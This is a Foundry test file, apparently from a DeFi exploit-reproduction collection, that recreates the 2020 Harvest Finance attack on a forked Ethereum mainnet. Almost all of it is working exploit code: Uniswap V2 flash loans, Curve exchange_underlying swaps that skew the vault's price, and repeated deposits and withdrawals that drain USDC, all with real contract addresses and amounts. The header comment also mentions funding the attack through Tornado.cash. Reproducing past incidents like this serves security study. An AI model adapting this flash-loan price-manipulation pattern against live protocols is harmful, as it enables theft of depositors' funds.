// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/* 
1.The attacker transfers 20 ETH through Tornado.cash as a subsequent attack fee

2. Attacker borrowed huge amounts of USDC and USDT through UniswapV2 flash loan

3. Attacker first uses Curve’s exchange_underlying function to change USDT to USDC. 
At this time, the investedUnderlyingBalance in the Curve yUSDC pool will be correspondingly smaller

4.The attacker then deposits a huge amount of USDC into the Vault through Harvest’s deposit. 
At the same time as the deposit, Harvest’s Vault will cast fUSDC. The calculation method of the amount cast is as follows:

    amount.mul(totalSupply()).div(underlyingBalanceWithInvestment());

The underlyingBalanceWithInvestment part of the calculation method takes the value of investedUnderlyingBalance in Curve. 
The change of investedUnderlyingBalance in Curve will cause Vault to cast more fUSDC.

5. Then attacker uses Curve to change USDC to USDT to bring the unbalanced price back to normal

6. In the end, attacker returns fUSDC to the Vault to get more USDC back

7. Then the attacker began to repeat the process and continue to make profits $$$


price was being fetched from curve. Curve specializes in stablecoin liquidity, 
hence stables were flash swapped from uniswap and used in the exploit
 */

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

interface IyCRVSwap {
    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external;
}

interface IHarvestUsdcVault {
    function deposit(uint256 amountWei) external;

    function withdraw(uint256 numberOfShares) external;

    function balanceOf(address account) external view returns (uint256);

    function strategy() external view returns (address);
}

interface ICRVStrategyStableMainnet {
    /**
     * Returns the underlying invested balance. This is the amount of yCRV that we are entitled to
     * from the yCRV vault (based on the number of shares we currently have), converted to the
     * underlying assets by the Curve protocol, plus the current balance of the underlying assets.
     */
    function investedUnderlyingBalance() external view returns (uint256);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;

    function balanceOf(address owner) external view returns (uint256);

    function transfer(address _to, uint256 _value) external;
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);
}

contract Initializations {
    // CONTRACTS
    // Uniswap USDC/WETH LP (UNI-V2)
    IUniswapV2Pair usdcPair =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    // Uniswap WETH/USDT LP (UNI-V2)
    IUniswapV2Pair usdtPair =
        IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);

    // yDAI+yUSDC+yUSDT+yTUSD
    IyCRVSwap yCRVSwap = IyCRVSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);

    // Harvest USDC pool
    IHarvestUsdcVault harvest =
        IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    // Harvest Strategy Vault
    ICRVStrategyStableMainnet harvestCurveStrategy =
        ICRVStrategyStableMainnet(0xD55aDA00494D96CE1029C201425249F9dFD216cc);

    // ERC20s --- 6 decimal all
    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    uint256 usdcLoan = 50000000 * 10**6;
    uint256 usdcRepayment = (usdcLoan * 100301) / 100000;
    uint256 usdtLoan = 17300000 * 10**6;
    uint256 usdtRepayment = (usdtLoan * 100301) / 100000;
    uint256 usdcBal;
    uint256 usdtBal;
}

contract ContractTest is Test, Initializations {
    function setUp() public {
        vm.createSelectFork("mainnet", 11129473); //fork mainnet at block 11129473
    }

    function testExploit() public {
        // create approvals only for tokens being transfered
        usdt.approve(address(yCRVSwap), type(uint256).max);
        usdc.approve(address(yCRVSwap), type(uint256).max);

        usdc.approve(address(harvest), type(uint256).max);

        usdt.approve(address(usdtPair), type(uint256).max);
        usdc.approve(address(usdcPair), type(uint256).max);

        emit log_named_uint(
            "Before exploitation, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        emit log_named_uint(
            "Before exploitation, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );

        // check what the reserves are like in the uniswap USDC/WETH pool
        (uint112 usdcReserve, uint112 WETHreserve01, ) = usdcPair.getReserves();

        (uint112 WETHReserve02, uint112 usdtReserve, ) = usdtPair.getReserves();

        emit log_named_uint("reserves of USDC", usdcReserve / 1e6);
        emit log_named_uint("reserves of USDT", usdtReserve / 1e6);

        emit log_named_address(
            "strategy being used by harvest USDC vault",
            harvest.strategy()
        );

        // we start by taking a hude USDC loan taht we'll use to deposit into the harvest pool nce the price is comprimised
        usdcPair.swap(usdcLoan, 0, address(this), "0x");
        //fallbacks to uniswapV2Call as calldata has length

        emit log_named_uint(
            "After exploitation, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        emit log_named_uint(
            "After exploitation, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        if (msg.sender == address(usdcPair)) {
            // get USDT flashloan to exchange in curve pool and disturb stasis
            usdtPair.swap(0, usdtLoan, address(this), "0x");

            // repay USDC flashloan
            bool usdcSuccess = usdc.transfer(address(usdcPair), usdcRepayment);
        }

        if (msg.sender == address(usdtPair)) {
            for (uint256 i = 0; i < 5; i++) {
                // manipulate prices and get USDCs
                theSwap(i);
            }
            // repay USDT flashloan
            usdt.transfer(msg.sender, usdtRepayment);
        }
    }

    function theSwap(uint256 i) internal {
        emit log(" ");

        emit log("=== Initial state before yCurve exchange ====");
        emit log_named_uint(
            "Before swap, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        emit log_named_uint(
            "Before swap, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );

        emit log(" ");
        emit log("exchanging USDT for USDC on yCurve...");

        // https://curve.readthedocs.io/factory-pools.html?highlight=exchange_underlying#StableSwap.exchange_underlying
        // swap USDT => USDC
        // this causes price of USDC to rise in this pool
        // if get_virtual_price was used by the harvest vault, there'd be no hack
        yCRVSwap.exchange_underlying(2, 1, 17200000 * 10**6, 17000000 * 10**6);

        emit log("yCurve exchange success");

        emit log(" ");
        emit log("==== After yCurve exchange state ====");
        emit log_named_uint(
            "USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        emit log_named_uint(
            "USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );

        emit log(" ");
        emit log("=== before harvest deposit ===");
        emit log_named_uint(
            "current underlying investment in yCurve by harvest strategy vault",
            harvestCurveStrategy.investedUnderlyingBalance() / 1e6
        );

        // we can only deposit in harvest --- total USDC balance in account - deposit for reverse in yCRV
        // in such a way that we have enough for deposit to curve for the reverse deposit of 17 mil
        // 49 mil in the current numbers allows for that 17 mil

        // deposit USDC to harvest
        emit log(" ");
        emit log("depositing USDC to harvest proxy vault...");
        harvest.deposit(49000000000000);

        emit log(" ");
        emit log("=== after harvest deposit ===");
        emit log_named_uint(
            "current underlying investment in yCurve by harvest strategy vault",
            harvestCurveStrategy.investedUnderlyingBalance() / 1e6
        );

        emit log(" ");
        emit log_named_uint(
            "fUSDC balance of attacker:",
            fusdc.balanceOf(address(this)) / 1e6
        );

        emit log_named_uint(
            "After harvest deposit, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );

        emit log_named_uint(
            "USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );

        emit log(" ");
        emit log("Reverse deposit to yCurve....");

        // reverse deposit to yCurve pool to boost USDC price and redeem from harvest
        // deposit USDC => USDT redemption
        // now USDC price drops in the pool
        yCRVSwap.exchange_underlying(1, 2, 17310000 * 10**6, 17000000 * 10**6);

        emit log(" ");
        emit log("=== after reverse swap in yCRV pool ===");

        emit log(
            "By depositing USDC to the yCRV pool, the USDC/yUSDC ratio returns to its original high, which allows us to withdraw more USDCs per fUSDC"
        );
        emit log_named_uint(
            "current underlying investment in yCRV by harvest strategy vault",
            harvestCurveStrategy.investedUnderlyingBalance() / 1e6
        );

        emit log(" ");
        emit log_named_uint(
            "fUSDC share balance of attacker:",
            fusdc.balanceOf(address(this)) / 1e6
        );

        // since price has dropped in the yCurve pool, we're allowed
        // to redeem more usdc for the same amount of fUSDC
        harvest.withdraw(fusdc.balanceOf(address(this)));

        emit log(" ");
    }

    receive() external payable {}
}
